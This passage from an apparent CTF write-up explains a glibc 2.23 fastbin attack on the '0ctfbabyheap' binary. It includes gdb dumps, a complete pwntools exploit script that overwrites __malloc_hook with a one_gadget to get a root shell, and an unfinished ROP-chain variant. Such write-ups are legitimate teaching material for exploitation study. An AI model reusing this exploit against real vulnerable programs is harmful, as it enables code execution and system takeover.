None of those look like they fit the structure of a heap chunk, luckly this address does not need to be aligned so we can use the MSB of the address at `__memalign_hook` (0x7f) to be a valid size.

```
gef➤  x/32gx 0x7fc38ec36b10-0x23
0x7fc38ec36aed <_IO_wide_data_0+301>:   0xc38ec35260000000      0x000000000000007f    <--- forged chunk (prev_size, size)
0x7fc38ec36afd: 0xc38e914b00000000      0xc38e914aa000007f
0x7fc38ec36b0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
0x7fc38ec36b1d: 0x0000000000000000      0x0000000000000000
```

Using `__malloc_hook-0x23` gives us a valid chunk with a prev_size of 0xc38ec35260000000 and a size of 0x7f.

The heap bins now after using `__malloc_hook-0x23`:
```
──────────────────────────────────────────────────────────────────────────────────────────────────────────── Fastbins for arena 0x7f6de6623b20 ────────────────────────────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x56188be2c270, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x7f6de6623afd, size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x6de6301b00000010]
Fastbins[idx=6, size=0x80] 0x00
```

That chunk now fits in the 0x70 fastbin. So if we make our other allocations also in the 0x70 fastbin then we have preformed the fastbin attack correctly.

The next allocation will be the chunk at 0x56188be2c270.
Then the next allocation after will be our forged chunk which points to 0x7f6de6623afd (`__malloc_hook-0x23`)

We can then use the Fill function the binary gave us like before to write anything at that address. For example, we can use 19 bytes of junk data to overwrite the memory right before the `__malloc_hook` symbol and then the next 8 bytes will write to the `__malloc_hook`

The payload below is a POC for this:
```python=
payload3 = b""
payload3 += b"A"*19
payload3 += b"BBBBBBBB"
```
Now next time we call malloc (or calloc in this case), the hook intercepts and jumps to 0x4242424242424242
```
0x00007ffde2e26248│+0x0018: 0x000055671ca9fa40  →   xor ebp, ebp
0x00007ffde2e26250│+0x0020: 0x00007ffde2e26380  →  0x0000000000000001
0x00007ffde2e26258│+0x0028: 0x000055671ca9fdd1  →   mov QWORD PTR [rbp-0x8], rax
0x00007ffde2e26260│+0x0030: 0x0000000000000000
0x00007ffde2e26268│+0x0038: 0x0000284ff92d03c0  →  0x0000000000000001
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fbd1b60326b <calloc+667>     and    DWORD PTR [rdx+0x48900000], ecx
   0x7fbd1b603271 <calloc+673>     mov    esi, DWORD PTR [rsp+0x28]
   0x7fbd1b603275 <calloc+677>     mov    rdi, rbp
 → 0x7fbd1b603278 <calloc+680>     call   rax
   0x7fbd1b60327a <calloc+682>     xor    esi, esi
   0x7fbd1b60327c <calloc+684>     test   rax, rax
   0x7fbd1b60327f <calloc+687>     mov    rdx, rbp
   0x7fbd1b603282 <calloc+690>     mov    rdi, rax
   0x7fbd1b603285 <calloc+693>     jne    0x7fbd1b603260 <__libc_calloc+656>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x4242424242424242 (
   $rdi = 0x000000000000000a,
   $rsi = 0x000055671ca9fdd1 →  mov QWORD PTR [rbp-0x8], rax,
   $rdx = 0x000000000000000b,
   $rcx = 0x00007ffde2e26241 → 0x4000007ffde2e262,
   $r8 = 0x00007ffde2e26242 → 0xfa4000007ffde2e2,
   $r9 = 0x0000000000000000
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "0ctfbabyheap", stopped 0x7fbd1b603278 in __libc_calloc (), reason: SIGSEGV
```

### One gadget

We can use `one_gadget` to find a ROP gadget that we can set to the `__malloc_hook` so when an allocation occurs, we drop to a shell.

```
root@test:/ctf/work# one_gadget /glibc/2.23/64/lib/libc-2.23.so
/var/lib/gems/2.7.0/gems/one_gadget-1.7.3/lib/one_gadget/fetchers/base.rb:32: warning: Using the last argument as keyword parameters is deprecated; maybe ** should be added to the call
/var/lib/gems/2.7.0/gems/one_gadget-1.7.3/lib/one_gadget/gadget.rb:27: warning: The called method `initialize' is defined here
0x3f3d6 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3f42a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd5bf7 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

At the time of the crash `rsp+0x30` == NULL, so we can use the second gadget.
```
gef➤  x/10x $rsp+0x30
0x7fffa1b558e0: 0x00000000      0x00000000      0x0280aac0      0x00002fe9
0x7fffa1b558f0: 0x00000009      0x00000001      0x60263800      0xe64d39bd
0x7fffa1b55900: 0xa1b55920      0x00007fff
```
## Final Script

```python=
from pwn import *
context.terminal = ['tmux', 'splitw', '-v']
file_path = "./0ctfbabyheap"
context.binary = elf =  ELF(file_path)
libc = elf.libc
io = process(file_path)

# gdb.attach(p)
def allocate(size):
    io.sendline("1")
    io.sendlineafter("Size:",str(size))

def fill(index, data):
    io.sendline("2")
    io.sendlineafter("Index:",str(index))
    io.sendlineafter("Size:",str(len(data)))
    io.sendlineafter("Content:",data)

def free(index):
    io.sendline("3")
    io.sendlineafter("Index:",str(index))

def dump(index):
    io.sendline("4")
    io.sendlineafter("Index:",str(index))
    io.readuntil(": \n")
    data = io.readline()
    io.readuntil(": ")
    return data

allocate(0x20)  
allocate(0x20)  
allocate(0x20)  
allocate(0x20)  
allocate(0x80) 
allocate(0x20) 

free(1)
free(2) 

payload1 = b""
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += b"\xc0"
fill(0, payload1)

#set to fastbin size
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x31)
fill(3,payload2)

allocate(32)  
allocate(32)    

#set back to unsorted size
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x91)
fill(3,payload2)

free(4) 

leak = u64(dump(2)[:8])
libc_base = leak-0x39bb78
print("Leak:",hex(leak))
print("Libc Base:",hex(libc_base))
libc.address = libc_base
malloc_hook = libc.symbols['__malloc_hook']
print("__malloc_hook:",hex(malloc_hook))
malloc_hook_write = libc.symbols['__malloc_hook'] -0x23

allocate(0x60) 
allocate(0x60)  
allocate(0x60)  
allocate(0x60)    
free(7)
free(8)

#overwrite fd to malloc_hook
payload2 = b""
payload2 += p64(0)*13
payload2 += p64(0x71)
payload2 += p64(0)*13
payload2 += p64(0x71)
payload2 += p64(malloc_hook_write)
fill(6,payload2)

one_gad = 0x3f42a+libc_base
allocate(0x60) 
allocate(0x60) 
payload3 = b""
payload3 += b"A"*19
payload3 += p64(one_gad)
fill(8,payload3)
allocate(1)
io.interactive()
```

Output:
```bash
root@test:/ctf/work# python3 0heap.py 
[+] Starting local process './0ctfbabyheap': pid 2532
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_ARM64'
[*] '/ctf/work/0ctfbabyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_ARM64'
[*] '/glibc/2.23/64/lib/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Leak: 0x7f36d777ab78
Libc Base: 0x7f36d73df000
__malloc_hook: 0x7f36d777ab10
Bin_sh: 139873517579316
[*] Switching to interactive mode
 $ whoami
root
```

## Addendum
(NOT FINISHED YET)
What if there were no usable `one_gadget`? 
```python=
from pwn import *
context.terminal = ['tmux', 'splitw', '-v']
file_path = "./0ctfbabyheap"
context.binary = elf =  ELF(file_path)
libc = elf.libc
io = process(file_path)

gdb.attach(io)
def allocate(size):
    io.sendline("1")
    io.sendlineafter("Size:",str(size))

def fill(index, data):
    io.sendline("2")
    io.sendlineafter("Index:",str(index))
    io.sendlineafter("Size:",str(len(data)))
    io.sendlineafter("Content:",data)

def free(index):
    io.sendline("3")
    io.sendlineafter("Index:",str(index))

def dump(index):
    io.sendline("4")
    io.sendlineafter("Index:",str(index))
    io.readuntil(": \n")
    data = io.readline()
    io.readuntil(": ")
    return data

allocate(0x20)  
allocate(0x20)  
allocate(0x20)  
allocate(0x20)  
allocate(0x80) 
allocate(0x20) 

free(1)
free(2) 

payload1 = b""
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += p64(0)*5
payload1 += p64(0x31)
payload1 += b"\xc0"
fill(0, payload1)

#set to fastbin size
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x31)
fill(3,payload2)

allocate(32)  
allocate(32)    

#set back to unsorted size
payload2 = b""
payload2 += p64(0)*5
payload2 += p64(0x91)
fill(3,payload2)

free(4) 

leak = u64(dump(2)[:8])
libc_base = leak-0x39bb78
print("Leak:",hex(leak))
print("Libc Base:",hex(libc_base))
libc.address = libc_base
malloc_hook = libc.symbols['__malloc_hook']
print("__malloc_hook:",hex(malloc_hook))
malloc_hook_write = libc.symbols['__malloc_hook'] -0x23

allocate(0x60) 
allocate(0x60)  
allocate(0x60)  
allocate(0x60)    
free(7)
free(8)

#overwrite fd to malloc_hook
payload2 = b""
payload2 += p64(0)*13
payload2 += p64(0x71)
payload2 += p64(0)*13
payload2 += p64(0x71)
payload2 += p64(malloc_hook_write)
fill(6,payload2)

one_gad = 0x3f42a+libc_base

pop_rsp = p64(0x0000000000003838+libc_base)# : pop rsp ; ret)
pop_rdi = p64(0x0000000000020e22+libc_base) #: pop rdi ; ret
bin_sh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols['system'])

rop_chain = pop_rsp
rop_chain += p64(malloc_hook+8)
rop_chain += pop_rdi
rop_chain += bin_sh
rop_chain += system

allocate(0x60) 
allocate(0x60) 
payload3 = b""
payload3 += b"A"*19
payload3 += rop_chain
fill(8,payload3)
allocate(1)
io.interactive()
```


